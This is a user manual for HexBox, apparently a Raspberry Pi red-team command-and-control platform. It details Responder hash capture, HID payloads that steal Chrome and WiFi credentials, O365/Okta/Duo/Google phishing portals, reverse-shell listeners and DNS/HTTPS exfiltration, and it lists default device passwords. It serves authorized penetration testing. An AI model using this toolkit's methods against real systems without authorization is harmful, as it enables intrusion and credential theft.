# HexBox Software Manual

**Version:** Phase 7  
**Platform:** Raspberry Pi 3B / 4 / 5  
**OS:** Raspberry Pi OS Bullseye or Bookworm (64-bit)  
**Classification:** Authorized Penetration Testing Use Only

---

> **LEGAL NOTICE:** HexBox is designed exclusively for authorized security assessments,
> penetration testing engagements, and security research conducted with explicit written
> permission from the target organization. Unauthorized use against systems you do not
> own or have written permission to test is illegal under the Computer Fraud and Abuse
> Act (CFAA), the Computer Misuse Act (CMA), and equivalent statutes worldwide.
> The authors assume no liability for misuse. Always operate within the scope of your
> engagement authorization.

---

## Table of Contents

1. [Introduction](#1-introduction)
2. [Architecture Overview](#2-architecture-overview)
3. [Hardware Requirements](#3-hardware-requirements)
4. [Software Requirements](#4-software-requirements)
5. [Installation & Initial Setup](#5-installation--initial-setup)
6. [Configuration Reference](#6-configuration-reference)
7. [Pre-Flight Validation](#7-pre-flight-validation)
8. [Dashboard Reference](#8-dashboard-reference)
   - 8.1 [Devices Tab](#81-devices-tab)
   - 8.2 [Intel Tab](#82-intel-tab)
   - 8.3 [Payloads Tab](#83-payloads-tab)
   - 8.4 [Loot Tab](#84-loot-tab)
   - 8.5 [Logs Tab](#85-logs-tab)
   - 8.6 [Report Tab](#86-report-tab)
   - 8.7 [War-Drive Tab](#87-war-drive-tab)
9. [API Reference](#9-api-reference)
10. [Module Reference](#10-module-reference)
    - 10.1 [hexbox_c2.py](#101-hexbox_c2py)
    - 10.2 [catcher.py](#102-catcherpy)
    - 10.3 [parse_loot.py](#103-parse_lootpy)
    - 10.4 [parse_pcap.py](#104-parse_pcappy)
    - 10.5 [exfil.py](#105-exfilpy)
11. [Payload Reference](#11-payload-reference)
    - 11.1 [DuckyScript Payloads](#111-duckyscript-payloads)
    - 11.2 [PowerShell Payloads](#112-powershell-payloads)
    - 11.3 [Bash/Shell Payloads](#113-bashshell-payloads)
    - 11.4 [Evil Portal Templates](#114-evil-portal-templates)
12. [Device Integration](#12-device-integration)
    - 12.1 [WiFi Pineapple](#121-wifi-pineapple)
    - 12.2 [Shark Jack](#122-shark-jack)
    - 12.3 [Packet Squirrel](#123-packet-squirrel)
    - 12.4 [LAN Turtle](#124-lan-turtle)
    - 12.5 [OMG Plug](#125-omg-plug)
    - 12.6 [Bash Bunny](#126-bash-bunny)
    - 12.7 [Flipper Zero](#127-flipper-zero)
13. [Script Reference](#13-script-reference)
14. [Intelligence Collection Pipeline](#14-intelligence-collection-pipeline)
15. [Covert Exfiltration](#15-covert-exfiltration)
16. [Mobile Companion App](#16-mobile-companion-app)
17. [Engagement Workflows](#17-engagement-workflows)
18. [Security Architecture](#18-security-architecture)
19. [OPSEC Guidelines](#19-opsec-guidelines)
20. [Troubleshooting](#20-troubleshooting)
21. [Appendix A — Device IP Reference](#appendix-a--device-ip-reference)
22. [Appendix B — Port Map](#appendix-b--port-map)
23. [Appendix C — Loot Directory Structure](#appendix-c--loot-directory-structure)
24. [Appendix D — Key Commands Quick Reference](#appendix-d--key-commands-quick-reference)

---

## 1. Introduction

HexBox is a self-contained red team command-and-control platform built on a Raspberry Pi 3B.
It unifies seven distinct hardware attack tools under a single authenticated web dashboard,
providing a centralized interface for network reconnaissance, credential collection, payload
delivery, intelligence aggregation, covert exfiltration, and engagement reporting.

The system is designed to be compact, battery-powered, and deployable in under two minutes.
A single operator can drop the device on a target network, connect via a management WiFi AP,
and immediately begin coordinating multi-vector attacks from any browser on any platform —
including a read-only mobile companion app for Android and iOS.

### Core Capabilities

| Category | What HexBox Does |
|---|---|
| Network Reconnaissance | nmap/masscan scans from Pi and Shark Jack; ARP sweeps; LLDP/CDP discovery |
| Credential Harvesting | Responder LLMNR/NBT-NS poisoning; HID payloads (Chrome, WiFi, AD); Evil Portal phishing |
| PCAP Analysis | tshark-powered extraction of HTTP, FTP, SMTP, Telnet, DNS credentials from inline captures |
| Active Directory | BloodHound v5 collection; LDAP user/group enumeration; NTLMv2 hash capture + hashcat cracking |
| Wireless Attacks | Pineapple deauth, karma, evil portal, PMKID capture, handshake cracking |
| Persistence & Tunnels | LAN Turtle AutoSSH reverse tunnels; Meterpreter staging; Sliver C2 implant generation |
| Covert Exfiltration | AES-256-GCM encrypted loot over DNS subdomain queries or HTTPS POST |
| Reporting | Self-contained HTML engagement reports aggregating all intelligence categories |

---

## 2. Architecture Overview

```
                    ┌─────────────────────────────────────┐
                    │         HexBox (Pi 3B)              │
                    │                                     │
                    │  ┌─────────────┐ ┌───────────────┐ │
                    │  │ hexbox_c2   │ │   catcher.py  │ │
                    │  │ Flask :1337 │ │  Flask :8000  │ │
                    │  └──────┬──────┘ └───────┬───────┘ │
                    │         │ SSE             │ loot    │
                    │  ┌──────▼──────────────────▼──────┐ │
                    │  │         ~/hexbox/loot/          │ │
                    │  │  creds/ nmap/ handshakes/ ...   │ │
                    │  └─────────────────────────────────┘ │
                    └──────────────┬──────────────────────┘
                                   │ SSH / SFTP / API
        ┌──────────┬───────────────┼────────────┬──────────┐
        │          │               │            │          │
   ┌────▼───┐ ┌────▼────┐  ┌──────▼────┐  ┌────▼───┐ ┌────▼────┐
   │Pineapple│ │SharkJack│  │  Packet   │  │  LAN   │ │  OMG   │
   │:1471   │ │SSH:22   │  │ Squirrel  │  │ Turtle │ │  Plug  │
   └────────┘ └─────────┘  │ SSH:22    │  │SSH:22  │ └────────┘
                            └───────────┘  └────────┘

   ┌──────────┐  ┌──────────────┐  ┌──────────────────────────┐
   │Bash Bunny│  │Flipper Zero  │  │  Attacker Laptop/Phone   │
   │SSH:22    │  │/dev/ttyACM0  │  │  browser → :1337 or PWA  │
   └──────────┘  └──────────────┘  └──────────────────────────┘
```

### Component Roles

| Component | Role | Protocol |
|---|---|---|
| `hexbox_c2.py` | Main C2 dashboard; orchestrates all devices | HTTP/Flask, SSE |
| `catcher.py` | Receives payload callbacks from target machines | HTTP :8000 |
| `parse_loot.py` | Parses and structures captured intelligence | Python library |
| `parse_pcap.py` | Extracts credentials from PCAP files via tshark | Python library |
| `exfil.py` | Encrypts and transmits loot over covert channels | DNS/HTTPS |
| `scripts/engage.sh` | One-command engagement startup | Bash |
| `scripts/opsec.sh` | OPSEC hardening and loot encryption | Bash |
| `scripts/preflight.py` | Go/No-Go pre-deployment validation | Python |

### Data Flow

```
Target Machine                 HexBox                        Attacker
──────────────                 ──────                        ────────
[payload executes] ──HTTP:8000─▶ catcher.py ──▶ loot/
[NTLMv2 hash]    ──LLMNR──────▶ responder  ──▶ loot/creds/ntlmv2.txt
[WiFi handshake] ──WPA2────────▶ Pineapple  ──▶ loot/handshakes/
[inline traffic] ──Ethernet────▶ Squirrel   ──▶ loot/pcaps/
                                    │
                                loot_watcher (5s poll)
                                    │ SSE
                                hexbox_c2.py ──▶ Browser dashboard
                                    │
                               [manual trigger]
                                    │ AES-256-GCM + gzip
                                exfil.py ──DNS/HTTPS──▶ Attacker C2
```

---

## 3. Hardware Requirements

### Supported Raspberry Pi Models

HexBox is fully compatible with Raspberry Pi 3B, 4, and 5. The setup script
auto-detects the model and applies model-specific configuration.

| Model | CPU | RAM | USB | WiFi | Power Supply | Key Advantage |
|---|---|---|---|---|---|---|
| **Pi 3B / 3B+** | Cortex-A53 1.2–1.4GHz | 1GB | USB 2.0 only | 2.4GHz only | 5V/2.5A Micro-USB | Lowest cost; sufficient for all features |
| **Pi 4** | Cortex-A72 1.5–1.8GHz | 2/4/8GB | USB 3.0 + 2.0 | 2.4 + 5GHz | **5V/3A (15W) USB-C** | Faster CPU cracking; true GbE; USB 3.0 |
| **Pi 5** | Cortex-A76 2.4GHz | 4/8GB | USB 3.0 + 2.0 | 2.4 + 5GHz | **5V/5A (27W) USB-C** | Fastest CPU; NVMe boot; PCIe Gen 2 |

#### Pi 5 Critical Notes

- **Power supply is mandatory:** The Pi 5 requires a genuine 27W (5V/5A) USB-C supply. Running with a standard 15W supply automatically throttles all USB ports to 600mA — not enough to power Hak5 devices. The setup script enables `usb_max_current_enable=1` in `/boot/firmware/config.txt` to unlock full current, but this only works with the correct supply.
- **Boot config path changed:** Pi 5 uses `/boot/firmware/config.txt` instead of `/boot/config.txt`. All HexBox scripts detect this automatically.
- **Flipper Zero on Bookworm:** USB CDC-ACM enumeration (`/dev/ttyACM0`) has known quirks on Pi 5 Bookworm. Test connectivity before deployment. If the device appears at a different path, update `config.json → flipper.serial_port`.

#### Pi 4 Notes

- USB 3.0 ports (blue) deliver faster loot transfers from Hak5 devices — always plug Shark Jack and Bash Bunny into blue ports.
- Dual-band WiFi (2.4 + 5GHz) enables 5GHz monitoring with a compatible external adapter.
- Requires `rpi-eeprom` for firmware updates — installed automatically by setup script.

### Interface Naming

On all Pi models, **Raspberry Pi OS** uses traditional interface names by default:
- Built-in Ethernet → `eth0`
- Built-in WiFi → `wlan0`
- USB Ethernet adapters → `eth1`, `eth2`, etc. (or `enx<mac>` if predictable names are enabled)

Predictable naming (e.g. `end0`, `wlp*`) is disabled by default. If a user enables it via
`raspi-config → Advanced → Network Interface Names`, `configure.sh` will show the actual
interface list and prompt for the correct names.

### Core Platform (Required)

| Component | Specification | Notes |
|---|---|---|
| Raspberry Pi 3B, 4, or 5 | See model table above | Pi 4 or 5 recommended |
| MicroSD Card | 64GB Class 10 A2-rated | Raspberry Pi OS Lite (64-bit); Pi 5 also supports NVMe |
| USB Battery Pack | 20,000mAh+ (see power table) | Pi 5 needs a 27W-capable bank |
| Powered USB Hub | 4+ port, 5V/2A per port | Required; Hak5 devices draw significant current |
| USB Ethernet Adapter | USB 3.0 Gigabit preferred | Pi has only one built-in NIC |

### Recommended Hak5 Devices

| Device | Purpose | Connection | Arming IP |
|---|---|---|---|
| WiFi Pineapple Mark VII | Wireless attacks, evil portal, karma | WiFi AP or USB | 172.16.42.1 |
| Shark Jack | Rapid network recon on plug-in | USB-C Ethernet | 172.16.24.1 |
| Packet Squirrel Mark II | Inline PCAP capture, MITM | USB Ethernet passthrough | 172.16.32.1 |
| LAN Turtle | Persistent foothold, reverse tunnel | USB Ethernet | 172.16.84.1 |
| OMG Plug | HID payload delivery via WiFi | WiFi callback | 192.168.1.50 (configurable) |
| Bash Bunny Mark II | HID + mass storage combo attacks | USB | 172.16.64.1 |
| Flipper Zero | NFC/RFID/Sub-GHz/BadUSB | USB serial `/dev/ttyACM0` | N/A |

### Optional Accessories

- Small HDMI touchscreen (direct console access without SSH)
- USB GPS module (for Kismet war-driving with coordinates)
- 3D-printed enclosure or Pelican case for field deployment
- USB-C to barrel-jack adapter for vehicle power

---

## 4. Software Requirements

### Raspberry Pi OS Compatibility

| OS Release | Codename | Python | pip Method | Status |
|---|---|---|---|---|
| Raspberry Pi OS 12 | **Bookworm** (current default) | 3.11 | `pip3 install --break-system-packages` after installing `python3-full` | ✅ Fully supported |
| Raspberry Pi OS 11 | **Bullseye** | 3.9 | `pip3 install` standard | ✅ Fully supported |
| Raspberry Pi OS 10 | Buster | 3.7 | — | ⚠️ Not tested; dependency versions may conflict |

`setup/hexbox_setup.sh` detects the OS codename and installs `python3-full` automatically on Bookworm.

### Python Dependencies (`requirements.txt`)

| Package | Version | Purpose |
|---|---|---|
| `flask` | ≥3.0.0 | Web framework for C2 dashboard and catcher |
| `paramiko` | ≥3.0.0 | SSH/SFTP client for Hak5 device control |
| `requests` | ≥2.31.0 | HTTP client for Pineapple API, BloodHound, Kismet |
| `colorama` | ≥0.4.6 | Terminal color output in preflight.py |
| `scapy` | ≥2.5.0 | Packet crafting and analysis support |
| `impacket` | ≥0.11.0 | SMB/NTLM/Kerberos protocol libraries |
| `pycryptodome` | ≥3.20.0 | AES-256-GCM encryption for exfil.py |
| `netaddr` | ≥0.10.0 | IP/CIDR address validation and manipulation |

### System Tools (installed by `setup/hexbox_setup.sh`)

| Category | Tools |
|---|---|
| Scanning | nmap, masscan |
| Poisoning / MITM | responder, bettercap, mitmproxy, ettercap, dsniff |
| WiFi | aircrack-ng, hcxdumptool, hostapd, dnsmasq |
| Cracking | hashcat |
| Packet Analysis | tcpdump, tshark, wireshark (CLI) |
| Exploitation | Metasploit Framework, Sliver C2 |
| AD Analysis | BloodHound CE (Docker), impacket tools |
| Wireless Mapping | Kismet |
| OPSEC | macchanger, tor, proxychains4, gpg, shred |
| Utilities | tmux, git, curl, python3, pip3, sqlmap, nikto, hydra |

---

## 5. Installation & Initial Setup

### Step 1 — Flash Raspberry Pi OS

```bash
# Download Raspberry Pi OS Lite (64-bit) from raspberrypi.com/software
# Flash with Raspberry Pi Imager; enable SSH and set hostname in Advanced Options
# Use Bookworm (current default) or Bullseye — both are supported
# Boot the Pi and SSH in:
ssh pi@<pi-ip>
```

> **Pi 5 tip:** An A2-rated microSD or NVMe drive (via M.2 HAT) significantly improves
> hashcat and tshark I/O performance compared to a standard A1 card.

### Step 2 — Clone Repository

```bash
git clone https://github.com/aingram702/hexbox ~/hexbox
cd ~/hexbox
```

### Step 3 — Run System Setup

```bash
# Auto-detects Pi model (3B/4/5) and OS (Bullseye/Bookworm)
# Installs all system tools, Python deps, configures IP forwarding,
# creates loot/log directories, installs MAC spoof systemd service
sudo bash setup/hexbox_setup.sh
```

This script performs:
- Detects Pi model from `/proc/device-tree/model`
- Detects OS codename from `/etc/os-release`
- Detects boot config path (`/boot/config.txt` or `/boot/firmware/config.txt`)
- `apt update && apt full-upgrade`
- Installs all tools listed in Section 4
- **Bookworm only:** installs `python3-full` (required for `--break-system-packages`)
- **Pi 4/5:** installs `rpi-eeprom` for firmware management
- **Pi 5 only:** appends `usb_max_current_enable=1` to boot config (requires reboot + 27W supply)
- Installs Metasploit via rapid7 omnibus installer
- Creates `~/hexbox/loot/` subdirectory tree
- Enables `net.ipv4.ip_forward=1` in `/etc/sysctl.conf`
- Installs and enables `macspoof.service` (dynamic interface enumeration — works on Pi 3, 4, and 5)

### Step 3b — Reboot (Pi 5 and Pi 4 Recommended)

```bash
sudo reboot
# Pi 5: required to apply usb_max_current_enable=1 and updated EEPROM settings
# All models: ensures macspoof.service runs on the next boot
```

### Step 4 — Install Python Dependencies

```bash
bash setup/install_dependancies.sh
# Equivalent to: pip3 install --break-system-packages -r requirements.txt
```

### Step 5 — Run Configuration Wizard

```bash
bash setup/configure.sh
```

The wizard prompts for:
- HexBox and C2 server IP addresses
- Network interface names (`ip link` to list)
- Device passwords (press Enter to keep Hak5 factory defaults)
- BloodHound CE and Kismet credentials
- Covert exfiltration settings (DNS domain, HTTPS endpoint, AES key)

The wizard writes `config.json` with `chmod 600` permissions and propagates the
attacker IP into all payload files automatically.

### Step 6 — Set Authentication Token

```bash
export HEXBOX_TOKEN="your-strong-secret-here"
# Or add to /etc/environment for persistence:
echo 'HEXBOX_TOKEN=your-strong-secret-here' | sudo tee -a /etc/environment
```

### Step 7 — Run Preflight Check

```bash
sudo python3 scripts/preflight.py
```

All checks must show PASS or WARN before deployment. Fix any FAIL items.

### Step 8 — Start Services

```bash
# Option A: One-command engagement launch
bash scripts/engage.sh 192.168.1.0/24

# Option B: Individual services
python3 c2/hexbox_c2.py &
python3 c2/catcher.py &
```

### Systemd Service (Optional — for auto-start)

```ini
# /etc/systemd/system/hexbox.service
[Unit]
Description=HexBox C2 Dashboard
After=network.target

[Service]
User=root
WorkingDirectory=/home/pi/hexbox
Environment=HEXBOX_TOKEN=your-strong-secret-here
ExecStart=/usr/bin/python3 /home/pi/hexbox/c2/hexbox_c2.py
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable hexbox
sudo systemctl start hexbox
```

---

## 6. Configuration Reference

`config.json` is the single source of truth for all HexBox settings.
It is written by `setup/configure.sh` and read at startup by every component.
Permissions are set to `600` — never commit this file.

```jsonc
{
  "hexbox": {
    "ip":             "10.0.0.99",      // HexBox attacker IP on engagement network
    "dashboard_port": 1337,              // C2 dashboard port
    "catcher_port":   8000,              // Payload callback receiver port
    "http_port":      80,                // Legacy HTTP (reserved)
    "loot_dir":       "~/hexbox/loot",   // Root directory for all captured data
    "log_dir":        "~/hexbox/logs",   // Service log files
    "scan_target":    "192.168.1.0/24"   // Default nmap target CIDR
  },

  "interfaces": {
    "management": "wlan0",   // Bettercap, Kismet; usually Pi WiFi or Pineapple interface
    "responder":  "eth0",    // Responder LLMNR/NBT-NS; USB Ethernet adapter on wired network
    "bettercap":  "wlan0"    // ARP spoof interface (usually same as management)
  },

  "devices": {
    "pineapple": {
      "ip":       "172.16.42.1",   // WiFi Pineapple management IP (arming mode)
      "user":     "root",
      "pass":     "hak5pineapple", // Change from factory default
      "api_port": 1471             // Pineapple web/REST API port
    },
    "sharkjack": {
      "ip":   "172.16.24.1",
      "user": "root",
      "pass": "hak5shark"
    },
    "packetsquirrel": {
      "ip":   "172.16.32.1",
      "user": "root",
      "pass": "hak5squirrel"
    },
    "lanturtle": {
      "ip":   "172.16.84.1",
      "user": "root",
      "pass": "hak5turtle"
    },
    "omgplug": {
      "ip":   "192.168.1.50",  // OMG connects back over WiFi; IP is engagement network
      "user": "root",
      "pass": "hak5omg"
    },
    "bashbunny": {
      "ip":   "172.16.64.1",
      "user": "root",
      "pass": "hak5bunny"
    }
  },

  "flipper": {
    "serial_port": "/dev/ttyACM0"  // Flipper Zero USB serial port
  },

  "bloodhound": {
    "url":      "http://localhost:8080",  // BloodHound CE Docker instance
    "username": "admin",
    "password": "BloodHound!"
  },

  "sliver": {
    "host": "127.0.0.1",   // Sliver C2 server (usually local)
    "port": 31337
  },

  "c2": {
    "external_ip":   "YOUR.C2.IP.HERE",  // Attacker VPS / listener IP
    "port":          443,
    "tor_enabled":   false,
    "vpn_interface": "tun0"
  },

  "kismet": {
    "url":      "http://localhost:2501",
    "username": "kismet",
    "password": "kismet"
  },

  "exfil": {
    "dns_domain":       "",       // Authoritative DNS zone for exfil (e.g., "exfil.attacker.com")
    "dns_server":       "8.8.8.8",// Recursive resolver to send queries to
    "https_url":        "",       // HTTPS exfil endpoint URL
    "https_token":      "",       // Bearer token (sent as X-HexBox-Token header)
    "aes_key":          "change-me-to-32-byte-secret-key!", // MUST change before engagement
    "https_verify_tls": true      // Set false for self-signed TLS certs
  }
}
```

### Post-Edit Steps

After manually editing `config.json`, restart the dashboard:

```bash
sudo systemctl restart hexbox
# Or if running manually, Ctrl+C and relaunch
```

---

## 7. Pre-Flight Validation

`scripts/preflight.py` runs a comprehensive GO/NO-GO checklist before every engagement.
It must be executed as root (`sudo python3 scripts/preflight.py`).

### Check Categories

| Section | What It Verifies |
|---|---|
| Permissions | Running as root |
| **Hardware Platform** | Pi model detected; Pi 5: `usb_max_current_enable` set; Pi 4/5: `rpi-eeprom` installed |
| Configuration | No placeholder values remain in config |
| Loot Directories | All subdirectories exist and are writable |
| Required Tools | nmap, responder, hashcat, gpg, macchanger, etc. |
| Python Packages | flask, requests, paramiko, scapy, impacket |
| System Services | ssh, tor, nginx, hexbox-dashboard |
| Network Interfaces | All configured interfaces are up with valid IPs |
| WiFi Pineapple | Ping, API port, live API call with firmware version |
| Shark Jack | Ping, SSH port, key-based auth |
| Packet Squirrel | Ping, SSH port, key-based auth |
| LAN Turtle | Ping, SSH port, key-based auth |
| OMG Plug | Callback port is listening, WiFi config is set |
| C2 Connectivity | Internet, VPN tunnel, Tor (if enabled), C2 server |
| GPG Encryption | gpg installed, key present for loot encryption |
| OPSEC Posture | Bash history off, hostname spoofed, MAC randomized, UFW active |

### Output Codes

| Code | Meaning |
|---|---|
| `[  PASS  ]` (green) | Check succeeded |
| `[  FAIL  ]` (red) | Critical failure — fix before deployment |
| `[  WARN  ]` (yellow) | Non-critical issue — review before deployment |
| `[  SKIP  ]` (white) | Device/feature disabled in config |
| `[  INFO  ]` (cyan) | Informational message |

### Final Decision

- **GO LIVE** (green banner): Zero FAIL items — cleared for deployment
- **NO GO** (red banner): One or more FAIL items with list of what to fix

A preflight report JSON is saved to `~/hexbox/logs/preflight_YYYYMMDD_HHMMSS.json`
for documentation.

---

## 8. Dashboard Reference

Access the dashboard at `http://<hexbox-ip>:1337`. Login with the token configured via
`HEXBOX_TOKEN` environment variable. Sessions persist via signed cookies.

The dashboard uses Server-Sent Events (SSE) at `/events` to push real-time updates
to all connected browsers without polling. New loot, process state changes, and
hashcat cracks appear instantly.

### SSE Event Types

| Event | Payload | Trigger |
|---|---|---|
| `new_loot` | `{path, size}` | New file detected in loot directory |
| `proc_start` | `{name, pid}` | Background process launched |
| `proc_stop` | `{name}` | Background process terminated |
| `hash_cracked` | `{count}` | hashcat `cracked.txt` modified |

---

### 8.1 Devices Tab

The Devices tab is the primary operational control surface. It shows a grid of seven
device cards and a process manager panel.

#### Device Status Grid

Each device card displays:
- Device name and icon
- Current status: **Online** (green), **Offline** (red), or **Checking** (yellow spinner)
- Last response time (milliseconds)
- Device-specific action buttons

Click **Ping All Devices** to run a parallel connectivity check against all seven
devices simultaneously.

#### Device Action Buttons

| Device | Available Actions |
|---|---|
| **WiFi Pineapple** | Start Recon, Deauth, Deploy Evil Portal, Monitor Mode, PMKID Capture, Pull Handshakes |
| **Shark Jack** | nmap Scan, ARP Scan, Pull Loot |
| **Packet Squirrel** | Start PCAP, Enable DNS Spoof, ARP Scan, Pull PCAPs |
| **LAN Turtle** | AutoSSH Tunnel, Start Responder, Stage Meterpreter, SSH Pivot |
| **OMG Plug** | Build & deliver each payload type; SFTP push to device |
| **Bash Bunny** | Status Check, Push Recon Payload, Pull Loot, Install Custom Payload |
| **Flipper Zero** | NFC Detect, RFID Read, BadUSB Run, Sub-GHz Capture |

#### Process Manager

The process manager lists all HexBox-managed background processes with their PIDs:

| Process | What It Does |
|---|---|
| `responder` | LLMNR/NBT-NS/MDNS poisoning; captures NTLMv1/v2 hashes |
| `hashcat` | GPU/CPU hash cracking; writes results to `loot/cracks/cracked.txt` |
| `bettercap` | ARP spoofing + DNS redirect MITM |
| `kismet` | Wireless AP scanning and GPS logging |
| `sliver` | Sliver C2 server daemon |
| `nc-4444/4445/4446` | Netcat reverse shell listeners |

Click **Stop** next to any process to send SIGTERM and remove it from tracking.

#### Covert Exfil Panel

The lower section of the Devices tab contains the exfiltration control panel:

- **Method selector**: DNS or HTTPS
- **File selector**: Optional — leave blank to exfil entire loot archive
- **Send** button: Packages, encrypts, and dispatches in a background thread
- **Config display**: Shows active exfil settings (domain, URL, key status)
- **Operation log**: Timestamped results of recent exfil operations

---

### 8.2 Intel Tab

The Intel tab aggregates all captured intelligence into structured tables.
The badge counter on each section header updates in real-time as new data arrives.

#### NTLM Hashes

Displays all NTLMv1/v2 hashes captured by Responder, deduplicated by username+domain.

| Column | Source |
|---|---|
| Type | NTLMv1 or NTLMv2 |
| Username | Domain\\User |
| Domain | AD domain or workgroup |
| Hash | Full NTLM response (ready for hashcat) |
| Source IP | Client machine IP |
| Captured | Timestamp |

**Copy All** button exports all hashes in hashcat-ready format (one per line).

#### WiFi Credentials

Parsed from `wifi_steal.ducky` output — shows SSID and plaintext PSK pairs collected
from target Windows machines via `netsh wlan show profile ... key=clear`.

#### Network Map

Parsed from nmap XML output. Each row shows:
- IP address, hostname, inferred OS
- Open ports (clickable to expand service details)
- Role inference: DC, Web Server, Printer, Database, etc.

Role is inferred from open port combinations:
- Port 88 + 135 + 389 → Domain Controller
- Port 80/443 → Web Server
- Port 9100/515/631 → Printer
- Port 1433/3306/5432 → Database Server

#### Chrome Databases

Lists paths to exfiltrated Chrome Login Data SQLite files. These are DPAPI-encrypted
on-disk but can be decrypted offline on the attacker's Windows machine using the
DPAPI master key from the target. File paths include hostname for identification.

#### System Profiles

JSON sysinfo blobs from `sysinfo.ps1`, showing:
- Hostname, domain membership
- Local administrators group members
- Installed AV products
- Running process list
- Network interfaces and IP addresses
- Mapped network shares

#### BloodHound Data

Lists collected BloodHound v5 JSON files with object counts (users, computers, groups).
The **Upload to BloodHound** button POSTs the JSON files to the BloodHound CE REST API
at the configured endpoint for attack path visualization.

#### PCAP Analysis

Runs tshark on selected PCAP file to extract:
- HTTP Basic/Digest authentication credentials
- HTML form POST credentials (login forms)
- FTP cleartext USER/PASS commands
- Telnet cleartext login sequences
- SMTP AUTH credentials
- DNS query log (A/AAAA records)
- Protocol hierarchy (packet count by protocol layer)

#### Portal Captures

Table of phishing credentials from Evil Portal deployments:

| Column | Value |
|---|---|
| Portal | Template name (O365, Okta, Duo, Google) |
| Username | Submitted username/email |
| Password | Submitted password |
| Timestamp | Capture time |
| Source IP | Victim IP address |

#### Cracked Passwords

Parsed from `loot/cracks/cracked.txt` (hashcat output format: `HASH:plaintext`).
The badge counter updates live when hashcat writes new cracks.
**Copy** button exports all cracked pairs.

---

### 8.3 Payloads Tab

#### Payload Builder

Select payload type and fill in parameters:

| Payload Type | Parameters | Output |
|---|---|---|
| Reverse Shell | Callback IP, port, delay (ms) | DuckyScript for TCP reverse shell |
| Browser Exfil | Catcher IP:port | DuckyScript to exfil Chrome Login Data |
| WiFi Steal | Catcher IP:port | DuckyScript to dump all WiFi profiles |
| Sysinfo | Catcher IP:port | DuckyScript to run sysinfo.ps1 |
| AD Recon | Catcher IP:port | DuckyScript to run ad_recon.ps1 |
| BloodHound | Catcher IP:port | DuckyScript to run bloodhound_collect.ps1 |

Generated payloads can be:
- Downloaded as `.ducky` file
- Pushed directly to OMG Plug or Bash Bunny via SFTP

#### Evil Portal

1. Select template (O365, Okta, Duo, Google)
2. Enter catcher IP:port for credential submission
3. Click **Preview** to render the template in an iframe
4. Click **Download** to save HTML for manual deployment
5. Click **Deploy to Pineapple** to SSH-push to the Pineapple and start Evil Portal service

---

### 8.4 Loot Tab

File tree browser of `~/hexbox/loot/`, grouped by category with file count per directory.
Click any filename to download it directly to the browser.

The loot directory auto-refreshes when new files arrive (via SSE `new_loot` event).

---

### 8.5 Logs Tab

Real-time log viewer. Select a service from the dropdown and specify line count.
Supported services: C2, Responder, Bettercap, hashcat, Sliver, Kismet.

---

### 8.6 Report Tab

#### Engagement Metadata

Fill in before generating:
- Engagement name
- Target organization / IP range
- Tester name and date
- Additional notes

#### Report Generation

Click **Generate Report** to produce a self-contained HTML file that includes:
- Engagement metadata header
- Executive summary with finding counts
- NTLM hash table
- Cracked password pairs
- Network map with service details
- WiFi credential table
- System profile summary
- Portal capture table
- PCAP credential findings

Reports are saved to `loot/reports/` and can be viewed inline or downloaded.

---

### 8.7 War-Drive Tab

#### Kismet Control

- **Start Kismet** launches the Kismet daemon on the management interface
- **Stop Kismet** terminates the daemon
- Status indicator shows daemon state and GPS fix status

#### Live AP Table

Populated by polling the Kismet REST API every 30 seconds:

| Column | Value |
|---|---|
| SSID | Network name (hidden shown as `[hidden]`) |
| BSSID | Access point MAC address |
| Channel | 802.11 channel number |
| Signal | RSSI in dBm |
| Encryption | WPA3/WPA2/WEP/Open |
| Latitude | GPS decimal degrees |
| Longitude | GPS decimal degrees |

#### Map View

Leaflet.js interactive map with AP markers:
- **Green** markers: Open/WEP networks
- **Red** markers: WPA2/WPA3 encrypted networks

Each marker popup shows SSID, BSSID, encryption type, and signal strength.

#### Export Options

- **CSV** — All network data in spreadsheet-compatible format
- **KML** — Google Earth-compatible file for geospatial analysis

---

## 9. API Reference

All routes except `/login`, `/logout`, and `/mobile/manifest.json` require authentication.
Authentication can be provided via:

1. **Session cookie** — Set after successful login at `/login`
2. **Header** — `X-HexBox-Token: <token>` on every request

### Authentication

| Endpoint | Method | Description |
|---|---|---|
| `GET /login` | GET | Render login form |
| `POST /login` | POST | Submit token; set session cookie; redirect to dashboard |
| `GET /logout` | GET | Clear session cookie; redirect to login |

### System

| Endpoint | Method | Description |
|---|---|---|
| `/` | GET | Render main dashboard (7-tab HTML) |
| `/events` | GET | SSE stream — keep-alive connection for real-time events |
| `/status` | GET | Ping all 7 devices in parallel; return JSON status map |
| `/processes` | GET | List tracked background processes with PIDs |
| `/stop/<name>` | POST | Kill named process; `name` must be in `_VALID_PROCS` whitelist |
| `/update/check` | GET | git log -1 to check for updates |
| `/update/apply` | POST | git pull --rebase to apply updates |
| `/restart` | POST | SIGHUP to gracefully restart dashboard |

### Loot

| Endpoint | Method | Description |
|---|---|---|
| `/loot` | GET | JSON file tree of loot directory |
| `/loot/file` | GET | `?path=<relative_path>` — Download file from loot dir |
| `/serve/<name>` | GET | Serve file from payloads/ directory (for stager callbacks) |

### Intel

| Endpoint | Method | Description |
|---|---|---|
| `/intel/creds` | GET | Aggregated NTLM hashes, WiFi creds, sysinfo, portal captures |
| `/intel/netmap` | GET | `?file=<nmap.xml>` — Parsed nmap host/port/service data |
| `/intel/cracked` | GET | Parsed hashcat cracked.txt entries |

### Exfil

| Endpoint | Method | Description |
|---|---|---|
| `/exfil/status` | GET | Status of exfil thread (running, last result, method) |
| `/exfil/send` | POST | `{"method":"dns|https","file":"optional/relative/path"}` — Trigger exfil |
| `/exfil/log` | GET | Tail exfil log with timestamps and sizes |

### Engagement Sessions

| Endpoint | Method | Description |
|---|---|---|
| `/engagement/new` | POST | `{"name":"...", "target":"...", "notes":"..."}` — Create session |
| `/engagement/set` | POST | `{"id":"..."}` — Activate a named session |
| `/engagement/list` | GET | List all saved engagement sessions |

### Reports

| Endpoint | Method | Description |
|---|---|---|
| `/report/generate` | POST | `{"name":"...", "target":"...", "notes":"..."}` — Generate HTML report |
| `/report/view` | GET | `?file=<report.html>` — Render report inline |
| `/report/download` | GET | `?file=<report.html>` — Download report file |
| `/report/stats` | GET | Summary counts for report header |

### WiFi Pineapple

| Endpoint | Method | Body / Params | Description |
|---|---|---|---|
| `/pineapple/recon` | POST | — | Start PineAP passive WiFi scanning |
| `/pineapple/deauth` | POST | `{"ssid":"..."}` | Broadcast deauth frames on SSID |
| `/pineapple/evil_portal` | POST | `{"template":"o365|okta|duo|google"}` | Deploy portal template |
